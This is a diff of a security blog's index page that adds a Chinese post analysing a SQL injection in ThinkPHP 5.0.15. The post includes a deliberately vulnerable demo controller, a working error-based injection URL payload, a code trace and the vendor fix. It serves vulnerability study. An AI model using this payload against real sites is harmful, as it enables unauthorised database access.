@@ -391,6 +391,195 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://0day.design/2019/04/15/ThinkPHP5 SQL注入漏洞分析/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Passer6y">
+      <meta itemprop="description" content="A salty fish">
+      <meta itemprop="image" content="/images/21.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Passer6y's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/04/15/ThinkPHP5 SQL注入漏洞分析/" itemprop="url">
+                  ThinkPHP5 SQL注入漏洞分析
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2019-04-15 09:46:00 / Modified: 09:58:30" itemprop="dateCreated datePublished" datetime="2019-04-15T09:46:00+08:00">2019-04-15</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2019/04/15/ThinkPHP5 SQL注入漏洞分析/#comments" itemprop="discussionUrl">
+                  <span class="post-meta-item-text">Comments: </span> <span class="post-comments-count valine-comment-count" data-xid="/2019/04/15/ThinkPHP5 SQL注入漏洞分析/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <a id="more"></a>
+<p>参考的红日安全团队的文章:<br><a href="https://github.com/Passer6y/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A51.md" target="_blank" rel="noopener">https://github.com/Passer6y/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A51.md</a></p>
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>第一次用composer安装源码，记录一下配置过程：<br>用brew安装composer：<code>brew install composer</code><br>更新一下composer：<code>composer self-update</code><br>安装国内镜像源：<code>composer config -g repo.packagist composer https://packagist.laravel-china.org</code></p>
+<p>安装漏洞环境，thinkphp 5.0.15:<br><code>composer create-project --prefer-dist topthink/think=5.0.15 tp5.0.15</code><br>将 composer.json 文件的 require 字段设置成如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;require&quot;: &#123;</span><br><span class="line">    &quot;php&quot;: &quot;&gt;=5.4.0&quot;,</span><br><span class="line">    &quot;topthink/framework&quot;: &quot;5.0.15&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>将数据库文件，报错信息开启后，在控制器中index.php写：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace app\index\controller;</span><br><span class="line"></span><br><span class="line">class Index</span><br><span class="line">&#123;</span><br><span class="line">    public function index()</span><br><span class="line">    &#123;</span><br><span class="line">        $username = request()-&gt;get(&apos;username/a&apos;);</span><br><span class="line">        db(&apos;users&apos;)-&gt;insert([&apos;username&apos; =&gt; $username]);</span><br><span class="line">        return &apos;Update success&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>paylaod:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://tp5.0.15/?username[0]=inc&amp;username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&amp;username[2]=1</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://static.zybuluo.com/Passer6y/rsmd393b1y88p4ov3ef4t5on/image_1d8d5drlc17qg1na9vcv1tt013tt9.png" alt="image_1d8d5drlc17qg1na9vcv1tt013tt9.png-97.9kB"></p>
+<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>从demo代码入手：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$username = request()-&gt;get(&apos;username/a&apos;);   // 强制类型转换成数组</span><br><span class="line">db(&apos;users&apos;)-&gt;insert([&apos;username&apos; =&gt; $username]);</span><br><span class="line">return &apos;Update success&apos;;</span><br></pre></td></tr></table></figure></p>
+<p>对其动态调试过程中，<code>request()-&gt;get()</code>，在thinkphp/library/think/Request.php 1093行对其数组的每个参数过滤：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public function filterExp(&amp;$value)</span><br><span class="line">&#123;</span><br><span class="line">    // 过滤查询特殊字符</span><br><span class="line">    if (is_string($value) &amp;&amp; preg_match(&apos;/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT LIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i&apos;, $value)) &#123;</span><br><span class="line">        $value .= &apos; &apos;;</span><br><span class="line">    &#125;</span><br><span class="line">    // TODO 其他安全过滤</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>显然这个过滤规则是形同虚设的。</p>
+<p>再来跟入: <code>db(&#39;users&#39;)-&gt;insert([&#39;username&#39; =&gt; $username]);</code><br>从上面payload可以发现数组的第一个值为<code>inc</code>， 是tp5新增的链式查询操作:<code>https://www.kancloud.cn/manual/thinkphp5/135178</code>,<code>Auto-increment</code>即自动创建主键字段值。</p>
+<p>thinkphp/library/think/db/Builder.php 726行insert 数据处理后进行拼接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">public function insert(array $data, $options = [], $replace = false)</span><br><span class="line">&#123;</span><br><span class="line">    // 分析并处理数据</span><br><span class="line">    $data = $this-&gt;parseData($data, $options);</span><br><span class="line">    if (empty($data)) &#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    $fields = array_keys($data);</span><br><span class="line">    $values = array_values($data);</span><br><span class="line"></span><br><span class="line">    $sql = str_replace(</span><br><span class="line">        [&apos;%INSERT%&apos;, &apos;%TABLE%&apos;, &apos;%FIELD%&apos;, &apos;%DATA%&apos;, &apos;%COMMENT%&apos;],</span><br><span class="line">        [</span><br><span class="line">            $replace ? &apos;REPLACE&apos; : &apos;INSERT&apos;,</span><br><span class="line">            $this-&gt;parseTable($options[&apos;table&apos;], $options),</span><br><span class="line">            implode(&apos; , &apos;, $fields),</span><br><span class="line">            implode(&apos; , &apos;, $values),</span><br><span class="line">            $this-&gt;parseComment($options[&apos;comment&apos;]),</span><br><span class="line">        ], $this-&gt;insertSql);</span><br><span class="line"></span><br><span class="line">    return $sql;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>thinkphp/library/think/db/Builder.php 118行选择了 inc模式 这里只是对数据进行清洗并没有对其进行过滤</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">switch ($val[0]) &#123;</span><br><span class="line">    case &apos;exp&apos;:</span><br><span class="line">        $result[$item] = $val[1];</span><br><span class="line">        break;</span><br><span class="line">    case &apos;inc&apos;:</span><br><span class="line">        $result[$item] = $this-&gt;parseKey($val[1]) . &apos;+&apos; . floatval($val[2]);</span><br><span class="line">        break;</span><br><span class="line">    case &apos;dec&apos;:</span><br><span class="line">        $result[$item] = $this-&gt;parseKey($val[1]) . &apos;-&apos; . floatval($val[2]);</span><br><span class="line">        break;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>数据清洗完后，value值被拼接进去：<br><img src="http://static.zybuluo.com/Passer6y/47w555l5o2ghy1cdikqnruoa/image_1d8f724ato7qe5bdh8h671j8p.png" alt="image_1d8f724ato7qe5bdh8h671j8p.png-307.5kB"></p>
+<p>接着在对其一番预处理参数绑定后再进行查库，thinkphp/library/think/db/Connection.php 456行：<br><img src="http://static.zybuluo.com/Passer6y/931jhgsx7141uag4mtw3dlyw/image_1d8f7dfs829a11t8f5l1e8na8216.png" alt="image_1d8f7dfs829a11t8f5l1e8na8216.png-548.3kB"></p>
+<p>同样的，从<code>thinkphp/library/think/db/Builder.php</code>可以知道，对<code>Inc</code>模式和对<code>dec</code>处理模式一样，所以同样也存在这个问题：<br><img src="http://static.zybuluo.com/Passer6y/ik5xnzy1lclz5e6ccyq4xkhg/image_1d8f9s34g1qjn1ki7irg12j71vbg3a.png" alt="image_1d8f9s34g1qjn1ki7irg12j71vbg3a.png-290.4kB"></p>
+<p>修复过程，将<code>composer.json</code>版本修改成<code>5.0.17</code>,执行<code>composer update</code>:</p>
+<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">switch ($val[0]) &#123;</span><br><span class="line">    case 'exp':</span><br><span class="line">        $result[$item] = $val[1];</span><br><span class="line">        break;</span><br><span class="line">    case 'inc':</span><br><span class="line"><span class="deletion">-        $result[$item] = $this-&gt;parseKey($val[1]) . '+' . floatval($val[2]);</span></span><br><span class="line"><span class="addition">+        $result[$item] = $item . '+' . floatval($val[2]);</span></span><br><span class="line">        break;</span><br><span class="line">    case 'dec':</span><br><span class="line"><span class="deletion">-        $result[$item] = $this-&gt;parseKey($val[1]) . '-' . floatval($val[2]);</span></span><br><span class="line"><span class="addition">+        $result[$item] = $item . '-' . floatval($val[2]);</span></span><br><span class="line">        break;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到改为拼接数组的键了：<br><img src="http://static.zybuluo.com/Passer6y/bbrlup3zenonuvidq1oi83iw/image_1d8faqgj6vr0nd8k9q8ouo9s44.png" alt="image_1d8faqgj6vr0nd8k9q8ouo9s44.png-409.2kB"></p>
+<p>看到这里，其实有几个疑问的：</p>
+<ol>
+<li>为什么使用框架提供的参数方法过滤这么简单</li>
+<li>将值换成键拼接还能注入吗？</li>
+</ol>
+<p>对于第一个问题，因为自己对thinkphp开发流程不熟悉原因，查阅<a href="https://www.kancloud.cn/manual/thinkphp5/118044" target="_blank" rel="noopener">文档</a>之后发现：<br><img src="http://static.zybuluo.com/Passer6y/8y2tjt5kivzwg0ma5y3bkk86/image_1d8f8g6lv13d5105o1hg7qmptdp20.png" alt="image_1d8f8g6lv13d5105o1hg7qmptdp20.png-81.1kB"><br>显然，就像上文分析的那样，默认情况下过滤就只有那些简单的关键字。</p>
+<p>对于第二个问题，之前以为是客户端可控的传入变量的键，后来调试的时候发现是：<br><img src="http://static.zybuluo.com/Passer6y/q8k2jp76sdo9x9lv70pf04lu/image_1d8fbcjdf15o7fjp5sbc7a1o64u.png" alt="image_1d8fbcjdf15o7fjp5sbc7a1o64u.png-29.5kB"></p>
+<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>总结一下利用条件：</p>
+<ol>
+<li>过滤规则为默认，即无过滤</li>
+<li>获取参数为array类型， 传入的三个参数，第一个为查询模式inc/dec，第二个未过滤为payload，第三个会进行<code>floatval()</code>类型转换，功能为递增的step</li>
+<li>最后就是存在一个可控的insert操作了</li>
+<li>开启报错才能报错注入</li>
+</ol>
+<p>参考：</p>
+<ol>
+<li><a href="https://packagist.laravel-china.org/" target="_blank" rel="noopener">Laravel China 社区维护的国内全量镜像</a></li>
+<li><a href="https://github.com/Passer6y/ThinkPHP-Vuln" target="_blank" rel="noopener">ThinkPHP-Vuln</a></li>
+</ol>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+	
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://0day.design/2019/04/13/TCTF:0CTF Web WriteUp/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1045,161 +1234,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://0day.design/2019/03/05/文件包含小结/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Passer6y">
-      <meta itemprop="description" content="A salty fish">
-      <meta itemprop="image" content="/images/21.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Passer6y's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/03/05/文件包含小结/" itemprop="url">
-                  文件包含小结
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-
-              
-                
-              
-
-              <time title="Created: 2019-03-05 16:22:00 / Modified: 16:28:24" itemprop="dateCreated datePublished" datetime="2019-03-05T16:22:00+08:00">2019-03-05</time>
-            
-
-            
-              
-
-              
-            
-          </span>
-
-          
-
-          
-            
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/2019/03/05/文件包含小结/#comments" itemprop="discussionUrl">
-                  <span class="post-meta-item-text">Comments: </span> <span class="post-comments-count valine-comment-count" data-xid="/2019/03/05/文件包含小结/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <p>梳理和总结了一下最近学的东西~<br></p>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2019/03/05/文件包含小结/#more" rel="contents">
-              Read more &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-	
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -1251,7 +1285,7 @@
                 
                   <a href="/archives">
                 
-                    <span class="site-state-item-count">23</span>
+                    <span class="site-state-item-count">24</span>
                     <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
@@ -1295,7 +1329,9 @@
                     
                       
                     
-                    <span class="site-state-item-count">5</span>
+                      
+                    
+                    <span class="site-state-item-count">6</span>
                     <span class="site-state-item-name">tags</span>
                   </a>
                 </div>
@@ -1408,7 +1444,7 @@
 
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共51.2k字</span>
+  <span class="post-count">博客全站共52.2k字</span>
 </div>
 
 <span id="busuanzi_container_site_pv" class="theme-info">
